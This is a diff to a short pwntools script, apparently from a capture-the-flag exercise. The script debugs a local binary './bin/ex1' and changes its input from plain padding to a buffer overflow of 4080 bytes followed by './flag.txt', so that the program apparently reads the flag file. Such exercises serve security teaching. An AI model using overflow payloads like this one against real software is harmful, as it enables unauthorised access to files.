@@ -6,12 +6,13 @@ context.terminal = ["tmux", "split-window", "-h"]
 io = gdb.debug(
     "./bin/ex1",
     """
-    b ex1.c:43
+    b ex1.c:64
     continue
     """,
 )
 
 io.sendline(b"1")
-io.sendline(b"A"*4115)
+io.sendline(b"A"*4080 + b"./flag.txt\0")
+io.sendline(b"2")
 io.interactive()
 
